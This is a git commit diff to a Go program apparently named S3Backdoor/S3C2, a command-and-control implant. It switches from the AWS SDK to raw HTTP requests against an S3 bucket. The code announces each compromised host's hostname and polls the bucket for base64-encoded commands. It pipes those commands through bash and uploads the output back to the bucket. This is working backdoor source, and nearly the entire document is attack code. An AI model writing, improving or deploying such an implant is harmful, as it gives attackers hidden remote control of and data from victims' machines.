2528783b4f4fa214ee81d39577666d97f0e13dc3
sparc <sparc.flow@hacklikeapornstar.com>
2020-01-26 10:29:58 +0100

    update_go

--- S3Backdoor/S3C2/main.go
+++ S3Backdoor/S3C2/main.go
@@ -5,12 +5,11 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"github.com/aws/aws-sdk-go/aws"
-	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/s3"
+	"io/ioutil"
+	"log"
+	"net/http"
 	"os"
 	exec "os/exec"
-	"strings"
 	"time"
 )
 
@@ -20,88 +19,66 @@ var (
 	region = flag.String("region", "eu-west-1", "AWS region")
 )
 
-func fail(msg string, o ...interface{}) {
-	fmt.Fprintf(os.Stderr, msg, o...)
-	os.Exit(1)
-}
-
 func b64Encode(input []byte) []byte {
 	data := make([]byte, base64.StdEncoding.EncodedLen(len(input)))
 	base64.StdEncoding.Encode(data, input)
 	return data
 }
 
-func execCmd(input string) []byte {
+func execCmd(input string) ([]byte, error) {
 	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("echo -ne %s |base64 -d |bash", input))
 	out, err := cmd.CombinedOutput()
-	if err == nil {
-		return out
-	}
-	return []byte(err.Error())
+	return out, err
 }
 
-func fetchData(svc *s3.S3, bucket, key string, notModified time.Time) (string, time.Time) {
-	buf := new(bytes.Buffer)
-	result, err := svc.GetObject(&s3.GetObjectInput{
-		Bucket:          aws.String(bucket),
-		Key:             aws.String(key),
-		IfModifiedSince: aws.Time(notModified),
-	})
+func fetchData(client *http.Client, url string, etag string) ([]byte, string, error) {
+	var body []byte
+	req, _ := http.NewRequest("GET", url, nil)
+	req.Header.Add("If-None-Match", etag)
+	resp, err := client.Do(req)
 	if err != nil {
-		if !strings.Contains(err.Error(), "Not Modified") {
-			fmt.Println(err)
-		}
-		if strings.Contains(err.Error(), "NoSuchKey") {
-			fmt.Println(err)
-			os.Exit(-1)
-		}
-		return "", notModified
+		return nil, "", err
 	}
-	buf.ReadFrom(result.Body)
+	defer resp.Body.Close()
+	body, err = ioutil.ReadAll(resp.Body)
 
-	return buf.String(), *result.LastModified
-
+	return body, resp.Header.Get("ETag"), nil
 }
-func uploadData(svc *s3.S3, bucket, key string, data []byte) error {
-	_, err := svc.PutObject(&s3.PutObjectInput{
-		Bucket:        aws.String(bucket),
-		Key:           aws.String(key),
-		Body:          bytes.NewReader(data),
-		ContentLength: aws.Int64(int64(len(data))),
-	})
+func uploadData(client *http.Client, url string, data []byte) error {
+	request, err := http.NewRequest("PUT", url, bytes.NewReader(data))
+	_, err = client.Do(request)
 	return err
 }
 func main() {
 	flag.Parse()
-	var cmd string
-	lastModified := time.Now()
-	reqKey := fmt.Sprintf("%s_req.txt", *key)
-	respKey := fmt.Sprintf("%s_resp.txt", *key)
-
+	var cmd []byte
+	var err error
+	etag := "None"
+	reqURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_req.txt", *bucket, *key)
+	respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_resp.txt", *bucket, *key)
+	client := &http.Client{}
 	if len(*bucket) < 1 {
-		fail("Please provide a bucket name (-bucket)\n")
+		log.Fatal("Please provide a bucket name (-bucket)\n")
 	}
-	if len(os.Getenv("AWS_SECRET_ACCESS_KEY")) < 1 || len(os.Getenv("AWS_ACCESS_KEY_ID")) < 1 {
-		fail("PLease setup environment variables AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID \n")
-	}
-	sess, _ := session.NewSession(&aws.Config{
-		Region: aws.String(*region)},
-	)
-	svc := s3.New(sess)
 
 	hostname, _ := os.Hostname()
-	uploadData(svc, *bucket, respKey, b64Encode([]byte(fmt.Sprintf("Got a new target %s", hostname))))
+	uploadData(client, respURL, b64Encode([]byte(fmt.Sprintf("Got a new target %s", hostname))))
+
 	for {
-		time.Sleep(1500 * time.Microsecond)
-		cmd, lastModified = fetchData(svc, *bucket, reqKey, lastModified)
+		time.Sleep(2 * time.Second)
+		cmd, etag, err = fetchData(client, reqURL, etag)
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		fmt.Println(string(cmd))
 		if len(cmd) < 1 {
 			continue
 		}
-
 		go func() {
-			output := execCmd(cmd)
-			if len(output) > 0 {
-				uploadData(svc, *bucket, respKey, b64Encode(output))
+			output, err := execCmd(string(cmd))
+			if err == nil {
+				uploadData(client, respURL, b64Encode(output))
 			}
 		}()
 	}
